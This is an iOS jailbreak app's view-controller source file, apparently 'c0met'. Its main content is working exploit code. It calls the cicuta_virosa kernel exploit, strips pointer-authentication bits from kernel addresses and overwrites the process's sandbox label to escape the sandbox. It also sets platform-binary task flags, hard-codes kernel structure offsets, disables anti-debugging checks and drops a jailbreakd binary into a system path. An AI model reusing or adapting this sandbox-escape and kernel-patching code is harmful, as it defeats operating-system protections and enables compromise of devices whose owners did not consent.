//
//  ViewController.m
//  c0metjb_rc1
//
//  Created by Ali on 15.02.2021.
//

#import "ViewController.h"
#import "cicuta_virosa.h"
#import <assert.h>
#import <stdlib.h>
#import <pthread.h>
#import <stdio.h>
#import <unistd.h>
#import <sys/types.h>
#import <sys/sysctl.h>
#import <errno.h>
#import "cicuta_virosa.h"
#import "voucher_utils.h"
#import "cicuta_log.h"
#import "descriptors_utils.h"
#import "fake_element_spray.h"
#import "exploit_utilities.h"
#import "comet.h"

#import "BypassAntiDebugging.h"
#import <stdio.h>
#import <stdlib.h>
#import <string.h>
#import <unistd.h>

#import <spawn.h>

#import <sys/types.h>
#import <sys/stat.h>
#import <dirent.h>

#import <sys/socket.h>
#import <sys/types.h>
#import <arpa/inet.h>
@interface ViewController ()
@property (strong, nonatomic) IBOutlet UILabel *ver_stat;
@property (strong, nonatomic) IBOutlet UIButton *jb_button;
@property (strong, nonatomic) IBOutlet UITextView *logjb;
@property (strong, nonatomic) IBOutlet UILabel *percent;
@property (strong, nonatomic) IBOutlet UIProgressView *progress;
@property (strong, nonatomic) IBOutlet UIButton *creditsButton;


@end

@implementation ViewController
-(void)log:(NSString*)log {
    _logjb.self.text = [NSString stringWithFormat:@"%@%@", _logjb.self.text, log];
}

#define LOG(what, ...) [self log:[NSString stringWithFormat:@what"\n", ##__VA_ARGS__]];\
printf("\t"what"\n", ##__VA_ARGS__)

#define in_bundle(obj) strdup([[[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@obj] UTF8String])

#define failIf(condition, message, ...) if (condition) {\
LOG(message);\
goto end;\
}

#define maxVersion(v)  ([[[UIDevice currentDevice] systemVersion] compare:@v options:NSNumericSearch] != NSOrderedDescending)


#define fileExists(file) [[NSFileManager defaultManager] fileExistsAtPath:@(file)]
#define removeFile(file) if (fileExists(file)) {\
[[NSFileManager defaultManager]  removeItemAtPath:@(file) error:&error]; \
if (error) { \
LOG("[-] Error: removing file %s (%s)", file, [[error localizedDescription] UTF8String]); \
error = NULL; \
}\
}

#define copyFile(copyFrom, copyTo) [[NSFileManager defaultManager] copyItemAtPath:@(copyFrom) toPath:@(copyTo) error:&error]; \
if (error) { \
LOG("[-] Error copying item %s to path %s (%s)", copyFrom, copyTo, [[error localizedDescription] UTF8String]); \
error = NULL; \
}

#define moveFile(copyFrom, moveTo) [[NSFileManager defaultManager] moveItemAtPath:@(copyFrom) toPath:@(moveTo) error:&error]; \
if (error) {\
LOG("[-] Error moviing item %s to path %s (%s)", copyFrom, moveTo, [[error localizedDescription] UTF8String]); \
error = NULL; \
}



- (NSURL *)applicationDocumentsDirectory
{
  return [[[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] lastObject];
}

- (void)viewDidLoad {
    [super viewDidLoad];
    NSString *currSysVer = [[UIDevice currentDevice] systemVersion];
    if([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/c0met.ini"]){
        [_jb_button setTitle:@"jailbroken" forState:UIControlStateNormal];
    }
    _ver_stat.self.text=currSysVer;
    disable_pt_deny_attach();
    disable_sysctl_debugger_checking();
        
    #if TESTS_BYPASS
    test_aniti_debugger();
    #endif
    
}




- (void)installBin:(NSString *)data
{
   
    //prepare_payload();
    NSString *openFile ;
       NSFileManager *fileManager = [NSFileManager defaultManager];
       NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
       NSString *documentsDirectory = [paths objectAtIndex:0];

           

          
    NSError *error = NULL;
    NSBundle* ucache;
     
    // Obtain a reference to a loadable bundle.
    ucache = [NSBundle bundleWithPath:@"uicache"];

    LOG("...");
    LOG("..");
    
    sleep(1);
    LOG("[+] Time to extract our bootstrap...");

    chmod(in_bundle("uicache"), 0777); //give it proper permissions
   
    removeFile("/var/containers/Bundle/iosbinpack64/bin/jailbreakd");
        if (!fileExists(in_bundle("jailbreakd"))) {
            chdir(in_bundle(""));
            
            
            
            
            
        }
        copyFile(in_bundle("jailbreakd"), "/var/containers/Bundle/iosbinpack64/bin/jailbreakd");
        
    
}



static unsigned off_p_pid = 0x68;               // proc_t::p_pid
static unsigned off_task = 0x10;                // proc_t::task
static unsigned off_p_uid = 0x30;               // proc_t::p_uid
static unsigned off_p_gid = 0x34;               // proc_t::p_uid
static unsigned off_p_ruid = 0x38;              // proc_t::p_uid
static unsigned off_p_rgid = 0x3c;              // proc_t::p_uid
static unsigned off_p_ucred = 0xf0;            // proc_t::p_ucred
static unsigned off_p_csflags = 0x290;          // proc_t::p_csflags

static unsigned off_ucred_cr_uid = 0x18;        // ucred::cr_uid
static unsigned off_ucred_cr_ruid = 0x1c;       // ucred::cr_ruid
static unsigned off_ucred_cr_svuid = 0x20;      // ucred::cr_svuid
static unsigned off_ucred_cr_ngroups = 0x24;    // ucred::cr_ngroups
static unsigned off_ucred_cr_groups = 0x28;     // ucred::cr_groups
static unsigned off_ucred_cr_rgid = 0x68;       // ucred::cr_rgid
static unsigned off_ucred_cr_svgid = 0x6c;      // ucred::cr_svgid
static unsigned off_ucred_cr_label = 0x78;      // ucred::cr_label

static unsigned off_sandbox_slot = 0x10;
static unsigned off_t_flags = 0x3A0; // task::t_flags




int launch(char *binary, char *arg1, char *arg2, char *arg3, char *arg4, char *arg5, char *arg6, char**env) {
pid_t pd;
const char* args[] = {binary, arg1, arg2, arg3, arg4, arg5, arg6,  NULL};

int rv = posix_spawn(&pd, binary, NULL, NULL, (char **)&args, env);
sleep(1);
return rv;
}
void patch_TF_PLATFORM(uint64_t target_task){
uint32_t old_t_flags = read_32(target_task + 0xA8);
old_t_flags |= 0x00000400; // TF_PLATFORM
write_32(target_task + 0xA8, (void*)old_t_flags);

// used in kernel func: csproc_get_platform_binary
}




+(NSArray*)arrayOfFoldersInFolder:(NSString*) folder {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray* files = [fm directoryContentsAtPath:folder];
    NSMutableArray *directoryList = [NSMutableArray arrayWithCapacity:10];
 
    for(NSString *file in files) {
        NSString *path = [folder stringByAppendingPathComponent:file];
        BOOL isDir = NO;
        [fm fileExistsAtPath:path isDirectory:(&isDir)];
        if(isDir) {
            [directoryList addObject:file];
        }
    }
 
    return directoryList;
}
int system_(char *cmd) {
    return launch("/var/bin/bash", "-c", cmd, NULL, NULL, NULL, NULL, NULL);
}
static uint32_t off_OSDictionary_SetObjectWithCharP = sizeof(void*) * 0x1F;
static uint32_t off_OSDictionary_GetObjectWithCharP = sizeof(void*) * 0x26;
static uint32_t off_OSDictionary_Merge              = sizeof(void*) * 0x23;

static uint32_t off_OSArray_Merge                   = sizeof(void*) * 0x1E;
static uint32_t off_OSArray_RemoveObject            = sizeof(void*) * 0x20;
static uint32_t off_OSArray_GetObject               = sizeof(void*) * 0x22;

static uint32_t off_OSObject_Release                = sizeof(void*) * 0x05;
static uint32_t off_OSObject_GetRetainCount         = sizeof(void*) * 0x03;
static uint32_t off_OSObject_Retain                 = sizeof(void*) * 0x04;

static uint32_t off_OSString_GetLength              = sizeof(void*) * 0x11;

 
-(void) installBootstrapAndUnsadbox:(NSString *)data
{

uint64_t task_pac = cicuta_virosa();
    LOG("\ntask PAC: 0x%llx\n", task_pac);
uint64_t task = task_pac | 0xffffff8000000000;

    LOG("PAC decrypt: 0x%llx -> 0x%llx\n", task_pac, task);

uint64_t proc_pac = read_64(task + 0x3A0);

    LOG("proc PAC: 0x%llx\n", proc_pac);
uint64_t proc = proc_pac | 0xffffff8000000000;
    LOG("PAC decrypt: 0x%llx -> 0x%llx\n", proc_pac, proc);
uint64_t ucred_pac = read_64(proc + 0xf0);
    LOG("ucred PAC: 0x%llx\n", ucred_pac);
uint64_t ucred = ucred_pac | 0xffffff8000000000;
    LOG("PAC decrypt: 0x%llx -> 0x%llx\n", ucred_pac, ucred);
uint32_t buffer[5] = {0, 0, 0, 1, 0};



uint32_t uid = getuid();
    LOG("getuid() returns %u\n", uid);
    LOG("whoami: %s\n", uid == 0 ? "root" : "mobile");
    LOG("escaping the prison of apple\n");
uint64_t cr_label_pac = read_64(ucred + 0x78);
uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
    LOG("PAC decrypt: 0x%llx -> 0x%llx\n", cr_label_pac, cr_label);
write_20(cr_label + 0x10, (void*)buffer);


[[NSFileManager defaultManager] createFileAtPath:@"/var/mobile/c0met.ini" contents:nil attributes:nil];
if([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/c0met.ini"]){
    LOG("sandbox_slot killed -> granted r/w\n");
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray* files = [fm directoryContentsAtPath:@"/"];
    NSMutableArray *directoryList = [NSMutableArray arrayWithCapacity:10];
 
    for(NSString *file in files) {
        NSString *path = [@"/" stringByAppendingPathComponent:file];
        BOOL isDir = NO;
        [fm fileExistsAtPath:path isDirectory:(&isDir)];
        if(isDir) {
            [directoryList addObject:file];
        }
    }
    NSError*error;
    
    uint64_t proc = ucred;

  
    uint64_t entitlements_pac = cr_label | 0x8;
    
    uint64_t real_ent=read_64(entitlements_pac);
    
    printf("entitlements: 0x%llx",real_ent);
    LOG("entitlements: 0x%llx",real_ent);
    //size_t len = strlen("get-task-allow") + 1;
    //uint64_t kern_size =vm_allocate(ucred, real_ent, len, VM_FLAGS_ANYWHERE);
    //write(real_ent, "get-task-allow", kern_size);
    //uint64_t vtab=read_64(real_ent);
    //uint64_t f=read_64(vtab + off_OSDictionary_GetObjectWithCharP);
    //printf("tfp allow dictionary: 0x%llx",f);
    //LOG("tfp allow dictionary: 0x%llx",f);
   
    sleep(2);

} else {
    printf("Could not escape the sandbox\n");
}

sleep(1);


}
- (IBAction)post_exploit:(UIButton *)sender {
  
    [self installBootstrapAndUnsadbox:@"pump some eggs"];

    if([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/c0met.ini"]){
        LOG("...");
        LOG("Sandbox looks ok from here sprayed some permissions.");
    }
    //this will bypass sandbox
    [self installBin:@"babe we are burning dat today"];
    _progress.self.progress=2.0;
    _percent.self.text=@"100% (Jailbreak Succeed!)";
}

- (IBAction)creditButton:(UIButton *)sender {
    NSString *message = [NSString stringWithFormat:@"c0met\n\nDeveloped by @maverickdev1\n\nExploit by @ModernPwner\n\nSandbox read/write privileges by @brandonplank"];
    
    UIAlertController *alertController = [UIAlertController alertControllerWithTitle:@"Credits" message:message preferredStyle:UIAlertControllerStyleAlert];
    UIAlertAction *Done = [UIAlertAction actionWithTitle:@"Ok" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action){
        [alertController dismissViewControllerAnimated:true completion:nil];
    }];
    [alertController addAction:Done];
    [alertController setPreferredAction:Done];
    [self presentViewController:alertController animated:true completion:nil];
}


@end
